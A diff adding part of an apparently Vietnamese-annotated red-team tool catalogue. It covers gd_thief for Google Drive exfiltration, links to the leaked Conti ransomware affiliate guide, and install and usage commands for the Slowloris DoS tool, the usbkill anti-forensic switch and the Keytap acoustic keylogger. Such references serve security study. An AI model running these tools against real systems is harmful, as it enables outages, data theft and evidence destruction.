+        -h, --help
+                Hiển thị thông báo trợ giúp và thoát
+```
+**Lưu ý:** Hướng dẫn sử dụng **script Python gd_thief.py**. Công cụ sử dụng các mode khác nhau để **exfiltrate**. `dlAll` tải xuống tất cả các file mà tài khoản có quyền truy cập. `dlDict` tải xuống các file có tên hoặc nội dung khớp với các từ khóa trong file dictionary. Cần có **token truy cập Google API** để sử dụng công cụ này.
+
+Nice [blog post](https://antman1p-30185.medium.com/youre-a-gd-thief-1e02358fd557) explaining the logic behind the tool.
+
+**Impact**
+====================
+
+### [🔙](#tool-list)Rò rỉ hướng dẫn pentester của **Conti**
+
+**Conti** is a ransomware group that is known for targeting large organizations and using sophisticated tactics to evade detection and maximize the impact of their attacks.
+
+**Conti** has been responsible for a number of high-profile ransomware attacks, including ones against the computer systems of the City of Pensacola, Florida, and the computer systems of the Irish health service.
+
+The [**Conti Pentester Guide Leak - Repository**](https://github.com/ForbiddenProgrammer/conti-pentester-guide-leak) contains leaked pentesting materials given to **Conti ransomware group affiliates**.
+**Lưu ý:** Repository này không phải là một **công cụ** trực tiếp mà là một tập hợp tài liệu (đã bị rò rỉ) mô tả các TTP (**Tactics, Techniques, and Procedures**) và **công cụ** được sử dụng bởi các **affiliate** (chi nhánh) của băng nhóm **ransomware Conti**. Rất hữu ích cho mục đích tình báo về mối đe dọa và phòng thủ.
+
+Topics include:
+
+- Configuring **Rclone** with **MEGA** for **data exfiltration**
+- Configuring **AnyDesk** as **persistence** and remote access into a victim’s network
+- Elevating and gaining admin rights inside a company’s hacked network
+- Taking over **domain controller**s
+- Dumping passwords from **Active Directory**
+**Lưu ý:** Danh sách các chủ đề quan trọng trong tài liệu rò rỉ, bao gồm các kỹ thuật **exfiltration**, duy trì truy cập (**persistence**), nâng quyền, kiểm soát **domain controller** và thu thập thông tin xác thực.
+
+**Note:** *[vx-underground.org](https://www.vx-underground.org/) obtained more training materials and tools used by **Conti ransomware** operators [tại đây](https://share.vx-underground.org/Conti/).*
+
+![image](https://user-images.githubusercontent.com/100603074/210856582-44a9bf16-23d4-4b7e-9e91-8604c3191e78.png)
+
+*Image used from https://github.com/ForbiddenProgrammer/conti-pentester-guide-leak*
+
+### [🔙](#tool-list)[**SlowLoris**](https://github.com/gkbrk/slowloris)
+
+**Slowloris** is a type of denial-of-service (DoS) attack that involves sending HTTP requests to a web server in a way that ties up the server's resources, preventing it from being able to process legitimate requests.
+
+This attack would typically be conducted with a **botnet**, it is designed to be difficult to detect and mitigate, as it uses a relatively small number of connections and does not generate a large amount of traffic.
+**Lưu ý:** Kỹ thuật tấn công DoS **Slowloris** không cố gắng làm ngập server bằng lưu lượng lớn, mà bằng cách duy trì nhiều kết nối HTTP đến server càng lâu càng tốt, khiến server không có đủ tài nguyên để phục vụ các kết nối hợp pháp.
+
+**Install (Pip):**
+
+```bash
+sudo pip3 install slowloris
+```
+**Lưu ý:** Cài đặt **công cụ Slowloris** bằng pip.
+
+**Install (Git):**
+
+```bash
+git clone https://github.com/gkbrk/slowloris.git
+cd slowloris
+```
+**Lưu ý:** Tải mã nguồn.
+
+**Cách sử dụng:**
+
+```bash
+# Pip
+slowloris example.com
+
+# Git
+python3 slowloris.py example.com
+```
+**Lưu ý:** Sử dụng công cụ để thực hiện tấn công DoS vào tên miền mục tiêu (`example.com`). Bạn cần thay `example.com` bằng mục tiêu thực tế.
+
+![image](https://user-images.githubusercontent.com/100603074/210115630-b6541ee0-ad82-471a-9a7e-7f0ec028c67d.png)
+
+### [🔙](#tool-list)[**usbkill**](https://github.com/hephaest0s/usbkill)
+
+This is an **anti-forensic kill-switch** that waits for a change in USB port status, immediately shutting down endpoint if a change is detected.
+
+In some situations, it is imperative that no data is added or removed from an endpoint via USB.
+
+This is where **USBkill** comes in.
+**Lưu ý:** **USBkill** là một **công cụ chống pháp y** tự động kích hoạt (thường là tắt máy ngay lập tức) khi có sự thay đổi trên cổng **USB** (ví dụ: cắm hoặc rút thiết bị USB). Điều này nhằm ngăn chặn dữ liệu bị sao chép ra ngoài hoặc bị đưa vào bằng thiết bị USB trong trường hợp khẩn cấp.
+
+**Install:**
+
+```
+git clone https://github.com/hephaest0s/usbkill
+cd usbkill
+./setup.py install
+```
+**Lưu ý:** Tải mã nguồn và cài đặt **công cụ Python** bằng **`setup.py`**. Yêu cầu cài đặt **Python** và **Git**.
+
+**Cách sử dụng:**
+
+```bash
+sudo python3 usbkill.py
+```
+**Lưu ý:** Chạy **script Python usbkill.py** với quyền **super user** (`sudo`) vì nó cần quyền truy cập vào trạng thái của cổng **USB**.
+
+![image](https://user-images.githubusercontent.com/100603074/217654429-98efef6d-b70f-48b8-8979-228ce2f78932.png)
+
+*Image used from https://en.wikipedia.org/wiki/USBKill*
+
+### [🔙](#tool-list)[**Keytap**](https://github.com/ggerganov/kbd-audio)
+
+This is a tool that can guess the pressed keyboard keys from the audio of a computer's microphone.
+
+**Keytap2** can also be used to retrieve text from audio snippets of keyboard typing.
+**Lưu ý:** Công cụ này phân tích âm thanh tiếng gõ phím để đoán xem các phím nào đã được nhấn (side-channel attack). **Keytap2** có thể là phiên bản cải tiến hoặc phần liên quan.
+
+**Install (Build):**
+
+```
+git clone https://github.com/ggerganov/kbd-audio
+cd kbd-audio
+git submodule update --init
+mkdir build && cd build
+cmake ..
+make
+```
+**Lưu ý:** Clone mã nguồn và các submodule, tạo thư mục build, cấu hình dự án bằng **CMake** và biên dịch (`make`). Yêu cầu các công cụ build C/C++ (gcc, clang...) và **CMake**. Chạy trên **Linux/macOS/Windows**.
+
+**Cách sử dụng:**
+
+```bash
+# Record audio to a raw binary file on disk
+./record-full output.kbd [-cN]
+
+# Playback a recording captured via the record-full tool
+./play-full input.kbd [-pN]
+
+# Record audio only while typing (Useful for collecting training data for keytap)
+./record output.kbd [-cN] [-CN]
+```
+**Lưu ý:** `record-full` ghi âm thanh đầy đủ. `play-full` phát lại file âm thanh đã ghi. `record` chỉ ghi âm thanh khi phát hiện gõ phím, hữu ích để thu thập dữ liệu huấn luyện. Cờ `-c`/`-p` có thể liên quan đến kênh âm thanh hoặc thiết bị. Output là các file `.kbd` thô. Để phân tích, cần sử dụng các module khác của **Keytap** (không hiển thị ở đây) hoặc **Keytap2**.
+
+See full usage documentation [tại đây](https://github.com/ggerganov/kbd-audio#tool-details).
+
+Try the online demo at [https://keytap.ggerganov.com/](https://keytap.ggerganov.com/).
+
+![image](https://user-images.githubusercontent.com/100603074/229649861-728e7ebb-ddb9-4347-9934-dd077d12bb41.png)
+
+*Image used from https://github.com/ggerganov/kbd-audio*
+
+
